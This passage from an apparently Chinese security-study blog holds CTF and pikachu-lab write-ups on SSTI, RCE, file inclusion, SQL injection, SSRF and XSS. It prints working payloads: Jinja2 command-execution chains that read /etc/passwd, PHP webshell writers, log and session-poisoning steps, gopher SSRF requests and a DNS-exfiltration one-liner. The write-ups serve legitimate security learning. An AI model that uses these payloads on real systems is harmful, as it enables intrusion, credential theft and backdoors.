对亮度&#x2F;对比度变化鲁棒\ndHash（差异哈希）：基于相邻像素的亮度差异，对整体亮度变化不敏感。\npHash（感知哈希）：基于频域变换（DCT），对缩放、轻微变形鲁棒。\n(2) 捕捉结构信息\n哈希方法能反映 边缘、纹理等结构特征，而不仅是颜色。\n(3) 计算速度快\ndHash 只需比较像素差异，比 RGB 聚类更快。\n❌ 缺点\n对颜色变化不敏感：如果两块 颜色不同但结构相同，哈希值可能相似。\n需要调整相似度阈值：判断“两张图是否相同”时，需设定汉明距离（Hamming Distance）阈值。\n\n\n\n色差统计：通过欧氏距离阈值 THRESHOLD=0.1，将相似特征的小块归为同一组。SUCTF2025 WriteUp - Z3n1th Blog\n\n隐藏信息的规律性：图片中隐藏的信息（如字母或符号）可能通过颜色差异编码，分割后的小块颜色特征可区分不同字符。\n\n特征向量的简洁性：使用颜色均值能快速表征小块的整体颜色，便于后续聚类比较。\n\nRGB 均值聚类的问题\n✅ 优点\n简单直接：计算每个小块的 RGB 均值，易于实现。\n对颜色变化敏感：适合区分 颜色差异较大 的图片块。\n❌ 缺点\n(1) 对亮度变化敏感\n如果两个图片块 内容相同但亮度不同（如一张较亮，一张较暗），RGB 均值可能差异较大，导致错误分类。\n\n\n\n\n原图片：\n\ngithub中的历史删除分支或者历史分支查找需要注意的是,这个历史分支的查找必须是在库没有被删除的前提下,仅仅是删除了分支或者更新了提交记录\n\nrepo -&gt; activity\n\n\n找到对应的历史分支 -&gt; compare change\n\n\n点击进入分支页面\n\n\n\n","categories":["打靶日记","hacktb"],"tags":["wireshark"]},{"title":"hacktb_春秋杯_NetHttP","url":"/2025/04/18/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/hacktb/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B_NetHttP/","content":"\n\n最关键的思路wireshark足够强,可以直接过滤出数据,然后可以用各种形式导出,可以直接导出成capcng或者给txt(可能会限制长度)也可以直接导出成json\nSSIT模板注入攻击(Server-Side Template Injection)指未经处理就将用户输入的内容作为web应用模板内容的一部分.\n1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园\nflask对应后端代码\nfrom flask import Flask,request,render_template_string,Response,sessionapp = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = &#x27;gdkfksy05lx0nv8dl&#x27;@app.route(&quot;/&quot;)def index():    return open(__file__).read()@app.route(&quot;/rce&quot;,methods=[&quot;GET&quot;])def rce():    data = request.args.get(&quot;name&quot;,&quot;Guest&quot;)    return render_template_string(f&quot;Welcome &#123;data&#125;&quot;)if __name__ == &quot;__main__&quot;:    app.run(host=&quot;0.0.0.0&quot;,port=8989,debug=False)\n\n\n\n高危代码!: return render_template_string(f&quot;Welcome &#123;data&#125;&quot;)\n直接将用户输入的东西渲染为模板返回,这样也是高危\ndata = request.args.get(&quot;name&quot;,&quot;Guest&quot;)return render_template_string(f&quot;Welcome + data&quot;)\n\n\n\n本次环境中漏洞执行前提SSTI 攻击原理\n模板引擎的工作方式：Flask 使用 Jinja2 模板引擎，它会解析模板中的特殊语法（如 &#123;&#123; &#125;&#125;）并执行其中的表达式。\n用户输入直接拼接：当用户控制的输入 (data) 被直接插入模板字符串时，攻击者可以注入模板语法。\n执行任意代码：通过精心构造的输入，攻击者可以访问 Python 内置对象和方法，最终实现远程代码执行。\n\nflask中的SSIT高危代码命令执行\n&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[123](&#x27;cat /etc/passwd&#x27;,shell=True,stdout=-1).communicate()[0]&#125;&#125;\n\n第一个Payload分析&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;\n\n分步解析：\n&#39;&#39;.__class__获取空字符串的类对象，即&lt;class &#39;str&#39;&gt;\n.__mro__[1]访问方法解析顺序(MRO)，获取父类&lt;class &#39;object&#39;&gt;(MRO返回元组：(str, object)，索引1是object)\n.__subclasses__()获取object的所有子类列表(约200-400个内置类)\n[X]选择特定索引的子类(攻击者需要找到包含os模块的类，常见目标如&lt;class &#39;os._wrap_close&#39;&gt;)\n.__init__.__globals__访问该类的初始化方法的全局命名空间字典(包含导入的模块和全局变量)\n[&#39;os&#39;]从globals中获取os模块引用\n.popen(&#39;cat /etc/passwd&#39;).read()通过os模块执行系统命令并读取结果\n\n实际攻击示例：如果&lt;class &#39;subprocess.Popen&#39;&gt;在索引123：\n&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[123](&#x27;cat /etc/passwd&#x27;,shell=True,stdout=-1).communicate()[0]&#125;&#125;\n\n第二个Payload分析&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;\n\n分步解析：\n().__class__获取空元组的类&lt;class &#39;tuple&#39;&gt;\n.__base__获取基类&lt;class &#39;object&#39;&gt;(与__mro__[1]等效)\n.__subclasses__()获取所有子类列表\n循环遍历&#123;% for x in ... %&#125; 遍历每个子类\n条件判断&#123;% if \"warning\" in x.__name__ %&#125; 查找类名包含”warning”的类(如&lt;class &#39;WarningMessage&#39;&gt;或&lt;class &#39;catch_warnings&#39;&gt;)\nx()._module.__builtins__实例化该类，访问其模块的builtins字典(包含所有内置函数和模块)\n[&#39;__import__&#39;](&#39;os&#39;)动态导入os模块\n.popen(&#39;id&#39;).read()执行系统命令\n\n为什么选择warning相关类？因为这些类通常会导入__builtins__，且在生产环境中普遍存在，可靠性高。\n关键技术点\n对象继承链利用通过__class__、__mro__、__base__、__subclasses__()等方法遍历Python对象继承体系\n模块导入技巧通过__globals__或__builtins__获取危险模块(os, subprocess等)\nJinja2特性模板中的&#123;&#123;&#125;&#125;会执行表达式，&#123;%%&#125;可以控制逻辑流程\n沙箱逃逸绕过Jinja2的沙箱限制，访问底层Python环境\n\n教训分离数据包发现很大的pacapng包的时候不要直接开始尝试解包,先看看数据包中是否有包含什么东西\nbinwalk -e ./NetHttP.pacpng\n\n查看POST的传输数据http.request.method == &quot;POST&quot;\n\n\n\n选择reponse中的内容http contains &quot;Welcome rce&quot;\n\n解题过程\n参考2025春秋杯网络安全联赛冬季赛-部分misc | CN-SEC 中文网\n\n\nwireshark打开数据包,发现超级大,连加载都很难,过滤出http,找到第一个包,发现存在源码泄露和框架注入的问题\n\n继续分析数据包发现关键的东西\nGET /rce?name=%7B%7Blipsum.__globals__.__builtins__.eval(%22__import__(&#x27;os&#x27;).popen(&#x27;echo%20aWYgWyAkKGNhdCAvYXBwL3NlY3JldC9tdy9tNXxiYXNlNjQgLXcgMHwgYXdrIE5SPT0xIHwgY3V0IC1jIDEpID09ICdxJyBdOyB0aGVuIGVjaG8gInJjZSI7Zmk=%20%7C%20base64%20-d%7Cbash&#x27;).read()%22)%7D%7D HTTP/1.1Host: 192.168.111.132:8989User-Agent: python-requests/2.32.3Accept-Encoding: gzip, deflate, brAccept: */*Connection: keep-alive\n\n关键url\naWYgWyAkKGNhdCAvYXBwL3NlY3JldC9tdy9tNXxiYXNlNjQgLXcgMHwgYXdrIE5SPT0xIHwgY3V0IC1jIDEpID09ICdxJyBdOyB0aGVuIGVjaG8gInJjZSI7Zmk=\n\nbase64解码后是\nif [ $(cat /app/secret/mw/m5|base64 -w 0| awk NR==1 | cut -c 1) == &#x27;q&#x27; ]; then echo &quot;rce&quot;;fi\n\n是一个linux bash脚本\n如果 [ $(读取 /app/secret/mw/m5 文件 | 用base64编码且不换行 | 取第一行 | 截取第一个字符) 等于 &#x27;q&#x27; ]; 那么 显示 &quot;rce&quot;; 结束\n\n这是一个最关键的点,检查后面多个包都会发现这个格式,据此判断实际上就是为了获取/app/secret/mw/m5,\n也就是flag很有可能就在这个文件中\n\n接下来的思路就应该是如何把所有的这个包找出来然后统一解base64然后来获取所有的== &#39;q&#39;的东西,但是在这个地方我的思维出现了插曲(ctrl点击跳转插曲). 按照wp思路就是筛选出数据包之后导出,然后使用vscode的正则表达式之类的选择方法来进行数据清洗，至于最关键的思路\n\n筛选出http的回复包含Welcome rce的数据包\nhttp contains &quot;Welcome rce&quot;\n\n\n\n导出筛选的数据\n\n\n\n然后就是在vscode中正则表达式选中所有的符合的加密式子,使用以下快捷键全部选中复制\nAlt + Enter\n\n然后cybercooker可以全部一块解码\n\n筛选对应的内容出来再次接base64然后发现一个这个no flag,无法解base64\n\n\n想起来tcp.stream eq 13还有一个密钥,但是加密了,tcp.stream eq 1有个私钥解密\n!!!!!!!!!!!!需要注意的是: 这里的私钥解密方式不是直接把这个rsa私钥导入wireshark然后输密码,而是应该直接解密!,因为wireshark中并没有被加密的tls数据!!!!!!!!!!!\n可以通过这个方式生成一个解密的2.pem\n$ openssl rsa -in 1.pem -out 2.pem\n\n可以通过私钥来获取rsa的所有数据SSL在线工具-在线RSA私钥解析-在线RSA私钥提取-SSLeye官网\n\n其实cyberchef更简单,但是似乎需要先base64解密(对于base64解密的rsa密文)\n\n在 CyberChef 的 RSA Decryption 操作中，Encryption Scheme 选项决定了 RSA 解密时使用的填充方式（Padding Scheme），不同的填充方式会影响安全性和适用场景。以下是详细解析：\n\nCyberChef 中的 RSA Encryption Scheme 选项\n\n\n选项\n正式名称\n填充方式\n特点\n适用场景\n\n\n\nPKCS#1 v1.5\nRSAES-PKCS1-v1_5\n固定格式填充\n较旧，可能存在漏洞\n兼容旧系统\n\n\nOAEP (SHA-1)\nRSAES-OAEP (SHA-1)\n随机化填充 + SHA-1\n更安全，但SHA-1较弱\n一般用途（逐步淘汰）\n\n\nOAEP (SHA-256)\nRSAES-OAEP (SHA-256)\n随机化填充 + SHA-256\n现代标准，推荐使用\n安全通信、HTTPS\n\n\nRaw\n无填充（教科书式RSA）\n直接加密明文\n极不安全，仅用于研究\n绝对不要用于生产环\n\n\n\n\n插曲首先要说明实际上是没有意义的,因为wireshark可以将过滤的内容全部导出\n考虑到存在很多的base64加密,所以我决定使用python来解析pcapng包,然后使用python直接进行base解密输出,\n首先就需要解析出http跟踪流的数据，然后在进行审计\n但是在这个34mb的数据包面前,会花费大量的资源和时间,此处不可行,但是总结了以下的一些操作方式\ntshark + subprocess使用python执行系统命令,对输出的调度结果直接进行解析之后处理数据\n✅ 优点: tshark就是wireshark的命令行版本,速度极快,对这种大文件的处理非常友好\n❌ 缺点: 目前并没有找到好的参考文档,输出的内容会全部先保存到内存中,而且需要全部输出完才能够继续让python处理,耗费极大的资源\n​\t\t  每一次调用命令(重新筛选)都需要重新对文件进行加载(否则需要用变量存储,超级大),不是很方便\n​\t\t  tshark无法直接返回python对象\ntshark打印http跟踪流\nimport subprocesstshark_path = r&#x27;C:\\Program Files\\Wireshark\\tshark.exe&#x27;&quot;&quot;&quot;使用tshark的follow功能提取完整HTTP流&quot;&quot;&quot;def extract_http_stream_follow(pcap_path, stream_id):    &quot;&quot;&quot;使用tshark的follow功能提取完整HTTP流&quot;&quot;&quot;    cmd = [        tshark_path,        &#x27;-r&#x27;, pcap_path,        &#x27;-q&#x27;,  # 安静模式        &#x27;-z&#x27;, f&#x27;follow,tcp,ascii,&#123;stream_id&#125;&#x27;  # 使用follow流功能    ]    result = subprocess.run(cmd, capture_output=True, text=True)    print(f&quot;\\n=== HTTP流 &#123;stream_id&#125; 完整内容 ===&quot;)    print(result.stdout)if __name__ == &#x27;__main__&#x27;:    # 使用示例    extract_http_stream_follow(&#x27;./NetHttP.pcapng&#x27;, 1)  # 提取流ID为0的完整内容\n\n\n\n⚠️注意:\n\npowershell似乎并不支持应用程序路径中有空格,但是cmd支持,不过python调用的环境应该是属于powershell环境,所以对于系统环境中的变量路径C:\\Program Files\\Wireshark\\tshark.exe时常会报找不到文件的错误\n直接在cmd中使用这个操作的前提还是需要放到环境变量中去\ntshark_path = r&#39;C:\\Program Files\\Wireshark\\tshark.exe&#39;必须要这样子的方式直接指明带空格的应用才能找到文件\n\npysharkpyshark是python版本的wireshark,可以直接进行处理流量包\n性能综合之下会好很多,但是对于需要遍历打印所有的http流也需要耗费很长的时间\nscapy处理大文件完全无法使用，性能太差了\n","categories":["打靶日记","hacktb"],"tags":["wireshark","SSIT"]},{"title":"pikachu_rce","url":"/2025/03/09/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/pikachu/rce/","content":"RCE 学习ping类型,执行系统命令$result.=shell_exec(&#x27;ping &#x27;.$ip)\n\necho可以执行系统命令无回显页面useradd xiaodisecpasswd xiaodisec 需要输入密码（无回显很难设置）\n标点特征linux特有 命令执行 会先执行里面的内容`| ` 把前一个命令输入到后一个`&amp;` 后台任务符号`:` linux特有`||` 逻辑或` `` `执行可以用在dns外带中在ping中执行以下语句就可以看到回显 \n whoami.dns…com\n然而windows下不支持；和` `` `，于是使用powershell支持定义变量和有对于字符的.replace()函数可以替换/，echo 命令可以直接执行，从而实现外带powershell支持；,需要注意的是注意这个replace玩不会改变原来变量的内容，需要自己来赋值\n127.0.0.1 | powershell $x&#x3D;whoami;$x&#x3D;$x.Replace(‘&#39;,’xxx’);$y&#x3D;’dns.log’;$z&#x3D;$x+$y;ping $z\n## `eval()`命令执行\neval($_POST[‘txt’]\n`POST`传入的`txt`内容马上会被执行exp\nfputs(fopen(‘shell.php’,’w’),’‘);\n\n\n","categories":["打靶日记","pikachu"],"tags":["rce"]},{"title":"pikachu_文件包含","url":"/2025/03/11/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/pikachu/include/","content":"文件包含查看类型先检查是只有一种还是两种都有(本地文件包含LFI &#x2F; 远程文件包含RFI)\n百盒类型php环境\ninclude(),require(),include_once(),require_once()\n\n需要在对应的php.ini下设置,这是需要提前设置的\nallow_url_fopen:默认值是ON。允许url里的封装协议访问文件；allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件；\n\ninclude()远程代码执行,实际上是在本地执行了远程的代码,返回的仍然是本地执行后的内容\nJAVA 环境\njava.io.file, java.io.filereader\n\nASP .NET环境\nSystem.IO.FileStream,System.IO.FileReader\n\n黑盒发现\n查看路径中是否有path,file,page,p,dir,pag,eng,achieve\n\n是否有文件上传如果有文件利用就直接利用文件\n如果没有文件利用\n\n\n包含日志文件利用\n包含session文件利用\n伪协议利用\n\n\n无文件支持伪协议利用\n参考文章 php伪协议 - 看不尽的尘埃 - 博客园 php伪协议 - 看不尽的尘埃 - 博客园\n\n伪协议实现无文件,但是文件读取和代码\n\n文件读取:file:///etc/passwd 需要绝对路径php://filter/read=convert.base64-encode/resource=1.php 相对路径,1.php\n\n文件写入\n使用这个filter&#x2F;write的时候需要后端有对应的代码支持\n\n?file=php://filter/write=convert.base64-encode/resource=phpinfo.php对应的post夹带contents=hello world\n后端代码如下\ninclude($_GET[file]);file_put_contents($_GET[file],$_POST[content]);\n\n\n\n\n也需要有对应的file传参点\n\n?file=php://input POST:&lt;?php fputs(fopen(&#x27;shell2.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;POST:&lt;?php file_put_contents(&#x27;shell.php&#x27;, &#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;);\n\n验证代码 cmd=echo &quot;success&quot;; 一定要加上回车!!!!!!\n\n\n\n代码执行php://inputPOST: &lt;?php phpinfo();?&gt;\n\ndata://text/plain,&lt;?php phpinfo();?&gt;\n\ndata://text/plain;base64,’base64加密后的内容‘\n\n\n\n日志文件包含 如果php被过滤了且无法绕过\n使用包含日志文件利用, 原理是修改UA头改成执行代码,访问日志路径时会被执行\n\n寻找框架,找出默认日志地址\n\nnginx默认访问路径地址 \n/var/log/nginx/access.log\n\napaceh的日志在类似目录下\n/var/log/httpd/access.log\n\nUser-Agent改成\nUser-Agent: aaaaaaaa&lt;?php system(&#x27;ls&#x27;);?&gt;User-Agent: aaaaaaaa&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;\n\n然后再访问access.log就可以得到执行的命令回显\nSESSION文件包含\n参考文档 \nsession包含 - lnterpreter - 博客园 session包含本地备份\nCtfshow Web入门 - 文件包含总结 - ch0bits - 博客园  本地备份\n\n配置session.save_path       //session文件存储地址session.upload_progress.enabled      //session文件上传上传session.upload_progress.cleanup     //定时清空文件\n\n信息搜集找到对应框架，发现默认session储存地址\n\nphpstudy默认地址\nD:\\AppGallery\\phpstudy_pro\\Extensions\\tmp\\tmp\n\nWindows服务器地址\n  C:\\\\WINDOWS\\Temp\n\nLinux服务器 linux服务器不分大小写D:\\AppGallery\\phpstudy_pro\\Extensions\\tmp\\tmp&#96;\n/tmp/session 或者 /var/lib/php/session\n\n原理在发包中的文件头中嵌入cookie设置senssion可以在本地的session路径下生成session名文件,但是由于session.upload_progress.cleanup的存在,上传的session马上会被删除,但是有确实短暂的在服务器中存在一段时间\n故使用条件竞争,想达到上传session之后在被服务器清除之前访问session的文件来执行里面的代码\n需要在访问包头中添加Cookie\nCookie: PHPSESSID=xiaodi  !!!!注意PHPSESSID书写\n\n\nPHP_SESSION_UPLOAD_PROGRESS 的作用当表单中包含 PHP_SESSION_UPLOAD_PROGRESS 字段且 PHP 配置 session.upload_progress.enabled &#x3D; On 时，PHP 会在文件上传过程中将进度信息写入 Session 文件（默认路径如 /tmp/sess_&lt;PHPSESSID&gt;）。\n\nSession 文件包含漏洞若服务器存在文件包含漏洞（如 include($_GET[&#39;file&#39;]);）且能包含 Session 文件（如 /tmp/sess_123），攻击者可通过构造恶意 Session 文件内容，使其被解析为 PHP 代码。\n\n利用链\n\n\n​\t通过上传表单注入 PHP 代码到 Session 文件。​\t通过文件包含漏洞触发 Session 文件中的恶意代码。​\t恶意代码生成 Webshell（shell.php）。\n操作\n恶意表单\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://school-server.us.kg:35565/pikachu/1.php&quot; method=&quot;POST&quot;     enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;? php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;);?&gt;&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n触发 Session 文件写入提交表单上传文件时，PHP 会生成 Session 文件，内容类似：\nupload_progress_&lt;?php fputs(...); ?&gt;|a:5:&#123;s:10:&quot;start_time&quot;;i:1620000000;...&#125;\n\n此处 upload_progress_ 是 PHP 自动添加的前缀，后面紧跟恶意代码。\n\n利用文件包含漏洞假设服务器存在文件包含漏洞（如 include($_GET[&#39;file&#39;]);），攻击者请求：\nhttp://target.com/include.php?file=/tmp/sess_123\n\n当包含 Session 文件时，PHP 会解析文件内容中的 &lt;?php ... ?&gt; 代码。恶意代码 fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;) 被执行，生成 Webshell。\n\n实施\n使用burpsuite的intruder功能,一个上传包含恶意表单的去建立session内容,一个访问session的路径\n/tmp/session/sess_xiaozhao\n\n只要有一次在被清除前访问了这个session就可以执行里面的恶意代码,建立后门文件\n\n\n","categories":["打靶日记","pikachu"],"tags":["fileinclude"]},{"title":"pikachu_sqli","url":"/2025/03/22/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/pikachu/sqli/","content":"union 注入必须满足后一个select的结果和前一个的列名相同, 如果后面的没有前面多, 必须通过数字来补齐\nselect * from member union select id,content,time,4,5,6,7 from message \n\n也可以通过注入语句\n你好&#x27; union select database(),version #\n\n不一定需要特定的表,可以直接执行\nupdatexml()此部分为mysql的特性，\n\nupdatexml()和extractvalue()有一样的作用\n\n\nEXTRACTVALUE 函数用于从 XML 文档中提取指定 XPath 表达式所匹配的值。它主要用于读取 XML 数据中的特定部分，是一个只读操作，不会对 XML 数据本身进行修改。\nUPDATEXML 函数用于更新 XML 文档中指定 XPath 表达式所匹配的节点的值。它可以修改 XML 数据，属于写操作。\n\n注意后面要使用注释#\n格式为updatexml(xml内容,xml路径,xml更新后的内容),原理是通过让这个xml路径不复合规范报错带出数据实际使用的时候这个xml路径可以结合\nextractvalue(xml内容,xml路径)只做查询不做修改\n实际使用的时候会使用concat()将需要的部分保存在两个一定不能通过校验的符号中(如何让全部的数据都校验失败呢),否则会被当作字符串逐个校验直到发现无法校验的.就会导致外带出来的东西不全面\nupdatexml(1,concat(0x7e,version(),0x7e),1)   updatexml 默认三个参数,但是两个参数也可以extractvalue(1,concat(0x7e,version(),0x7e))  extractvalue 只需要两个参数\n\n\n实际上在这里面0x7e表示的是符号~,其他十六进制符号也可以\n\n如果是updatexml(1,concat(1,version(),0x7e),1)回显出来的就会是XPATH syntax error: &#39;.26~&#39;\n如果是updatexml(1,concat(0x7e,version(),0x7e),1),回显出来的就是XPATH syntax error: &#39;~5.7.26~&#39;,这是由于浮点数只能有一个小数点,再来一个就不合法了\n使用&#39;#&#39;,0x5e24之类的其实都可以\nupdatexml函数最多输出32个字节。这个时候md5解密是解不出来的，因为~的存在占据一位，密文只有31位，所以substring函数作用就出来了\nupdatexml(1,concat(0x7e,substring((select password from users limit 0,1), 32)),0)#\n\n这个函数，一个是要截取的内容，一个是开始的位数substring(xx,yy)从yy位开始\n也要考虑通过or来连接\nzzzz&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;\n\n\n\n\n\n\n\n查询表名select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 2,1\n\ninformation_schema是一个系统数据库表示数据库中的表就是infomation_schema.tables\nlimit n,m的参数是从n开始,查询m个值\n盲注\n数据库只能返回规定的东西而不能额外带出其他的数据,也就是不会返回报错信息的时候,可以按照其他方法来尝试注入\n\nphp使用mysql_query()来代替execute()不会打印错误回显\n回显盲注\n会返回部分信息\n\n\n爆数据库长度\n  lucy&#x27; and length(database())=7 #\n  必须要#注释后面的内容\n  原理是如果and后面的判断是错的,那么数据库就不会回显,如果是对的,那么就会正常返回lucy查询的内容\n\n爆数据库名\n  lucy&#x27; and left(database(),2)=&#x27;pi&#x27; #\n  还是原来的道理, 可以先爆出数据库名字的长度在爆破数据库的具体名称,还是一样的,只有当数据库中第二个等式成立才会返回lucy查询的内容\n\n\n时间盲注\n啥都不返回的时候可以尝试使用\n\nlucy&#x27; and if(database()=&#x27;pikachu&#x27;,sleep(10),sleep(0)) #\n\n使用if(判断,true执行,false执行)语句来进行,本质是通过sleep()函数来达成目的,然后通过调换sleep()的时间,观察是否有区别,就可以判断是否存在事件注入\nlucy&#x27; and if(database()=&#x27;pikachu&#x27;,sleep(0),sleep(10)) #\n\n在这里length()和left()也是一样可以拿来用\n也可以使用substr和substring来爆破数据库名\nsubstr(String,startIndex,lenth)： 第二个参数是截取字符串的长度（从起始点截取某个长度的字符串）；substring(String,startIndex, endIndex)： 第二个参数是截取字符串最终的下标 （截取2个位置之间的字符串,‘含头不含尾’）。若只写一个参数两者完全一样，都是截取从当前下标以后直到字符串最后的字符串片段。\n\nexample\nString = &#x27;abcdefghijklmn&#x27;aa = substr(string,3,5)bb = substring(string,3,5)aa = &#x27;cdefgh&#x27;bb = &#x27;cde&#x27;\n\n与编程语言的区别就是mysql是从1开始的\nsleep被过滤","categories":["打靶日记","pikachu"],"tags":["sqli"]},{"title":"pikachu_ssrf","url":"/2025/03/13/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/pikachu/ssrf/","content":"ssrf\nSSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。\n翻译翻译就是通过服务端打内网就是ssrf\n\n伪协议思路\n在不同的服务中支持的伪协议类型是不一样的\n在PHP中支持的伪协议\n&gt;file dict sftp ldap tftp gopher\n\n在JAVA中支持的伪协议\n&gt;file ftp mailto http https jar netdoc\nfile如果是linux服务器,并且可能存在ssrf漏洞,就可以尝试开始内网横向\nfile:///etc/passwd  尝试读取文件passwdfile:///etc/hosts   显示当前操作系统网卡IPfile:///proc/net/arp   显示arp缓存表,寻找内网其他主机file:///proc/net/fib_trie  显示当前网段路由信息\n\n可以使用burp去使用http协议去访问内网的其他主机,基于部分的arp表,建立80通信以前一定会先尝试使用arp去获取内网地址,从而达成记录arp信息的操作\n\n需要注意的是,可能内网设置了防火墙限制,可能限制了arp协议,会导致记录的所有mac地址都是网关的mac地址\n\ndictdict协议是用来提供字典查询服务的,默认端口 2628\ndict协议比较灵活允许自定义IP和端口和CRLF注入(换行符之类)\ndict协议比较小众,容易在设置黑名单的过滤中绕过\n\n\n服务器配置：\n应用层过滤：若服务端未对目标IP进行内网限制，或过滤逻辑不严谨（如仅检查http协议），dict协议可能绕过限制。\n网络层限制：即使应用允许请求，服务器的防火墙或出站规则可能阻止对外部特定端口（如非标准端口）的连接。\n\n\n协议兼容性：\ndict协议基于TCP，若目标服务（如HTTP、Redis）运行在TCP端口且未验证协议格式，可能返回banner信息或执行命令（需构造有效载荷）。\n例如，连接到Redis的6379端口并发送命令可能触发漏洞，但需通过CRLF注入等方式适配目标协议。\n\n\n响应处理：\n即使连接成功，服务端对dict响应的处理方式可能影响信息泄露效果（如解析HTTP响应为字典数据）。\n\n\n\n\nsftpSFTP要求客户端用户必须由服务器进行身份验证，\n并且数据传输必须通过安全通道（SSH）进行，即不传输明文密码或文件数据。\n是SSH协议的一部分,是一种远程登录信息\ngopher协议 很重要的伪协议\n重要与可以提交POST请求,可以用来替代http伪协议无法处理的事情\ngopher默认端口为70, 进行ssrf渗透测试的时候注意修改端口为80或者对应端口\n\ngopher转发默认不发送一个字符(会被吃掉)\nGET\n注意端口号和填充值\n\n\n直接发送数据\ncurl gopher://127.0.0.1/nihoaxiaozhu\n\n监听端会在70端口收到ihaoxiaozhu,第一个会被吞掉,需要对方收到完整的东西需要发送\ncurl gopher://127.0.0.1/_nihoaxiaozhu\n\n\n\n使用ssrf\n 具有ssrf漏洞的页面发送\n复制这个头, 保留GET和Host的信息,注意一定要留着一个换行,然后对以下进行url编码, 注意必须连同换行一块编码\nGET / HTTP/1.1Host: tryoneclick.art:35565\n\nGET%20/%20HTTP/1.1%0D%0AHost:%20tryoneclick.art:35565%0D%0A\n\n\n\n但是拼接上去的时候需要在前面加个_,用来被吞掉\ngopher://targetip:80/_GET%20/%20HTTP/1.1%0D%0AHost:%20tryoneclick.art:35565%0D%0A\n\n\n\n​\t\n   如果是存在ssrf漏洞的页面是通过POST来进行渗透的,也可以在burp中编辑gopher信息\n   需要注意的是,这个是在浏览器中填写的,如果是在burpsuite中抓包得到的, 需要对这个url信息进行再次的url编码(总共对这个头信息编码两次)\n   也就是发送的对上述的gopher://targetip:80/_后面的内容进行再一次url编码\n   gopher%3A%2F%2Ftargetip%3A80%2F%5FGET%2520%2F%2520HTTP%2F1%2E1%250D%250AHost%3A%2520tryoneclick%2Eart%3A35565%250D%250A\n\n​\t两次url编码这是由于发送到ssrf服务器的时候会做一次解码,ssrf发送到目标内网服务器的时候会在做一次解码\nPOST","categories":["打靶日记","pikachu"],"tags":["ssrf"]},{"title":"pikachu_xss注入","url":"/2025/03/17/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/pikachu/xss/","content":"dom-xss注入\n使用浏览器翻译html的方法dom,构造dom进行注入(dom就是浏览器将html静态文本翻译成可编辑树的方法)\n\n&lt;a href=&quot;&quot; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;\n&lt;img src=&quot;#&quot; onclick=alert(1)&gt;\n&#39; onclick=alert(&#39;xss&#39;)&gt;\n&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;\nonclick也可以是onmouseover\n注意: 需要闭合对应的单引号或者是&lt;&gt;\nhtmlspecialchars()方法\nhtmlspecialchars()是php中为了防止xss注入之类的恶意手法,通过对传输到前端的一些特定字符进行替换,达成告知浏览器那就是文本而不是标签的目的,替换&#39;,&quot;,&amp;,&lt;,&gt;\n\nhtmlspecialchars(string,flags,character-set,double_encode)\n\nflags参数可用的引号类型\n\nENT_COMPAT ：默认仅编码双引号。\n\nENT_QUOTES：编码双引号和单引号。\n\nENT_NOQUOTES：不编码任何引号。\n\n\n\n\n可以使用javascript:alert(1)这样的方法来进行注入\n&#39; onclick=&#39;alert(&quot;xss&quot;)也可以尝试进行注入,本题中可能是因为设置了特定字符知转义&lt;,&gt;,&quot;,可以通过f12进行查看\n需要注意的是: 目前并不清楚在上面情况下onclick=后面接的alert(1)需要添加&#39;&#39;\n&lt;p class=&#39;notice&#39;&gt;你的输入已经被记录:&lt;/p&gt;&lt;a href=&#39;&#39; onclick=&#39;alert(&amp;quot;xss&amp;quot;)&#39;&gt;&#39; onclick=&#39;alert(&amp;quot;xss&amp;quot;)&lt;/a&gt; \n\n目前似乎发现添加&#39;&#39;可以成功触发xss的条件需要在&lt;a&gt;标签中,在&lt;script&gt;&lt;/script&gt;似乎并不允许\n\nxss之js输出输入的信息直接插入js中,让前面的&#39;闭合,按照js格式插入alert(1),再仿照前面的格式建立一个新的闭合\npayload\n&#x27;;alert(1);$ms=&#x27;12\n\n题目是这样的\n&lt;script&gt;    $ms=&#x27;输入的东西&#x27;;    if($ms.length != 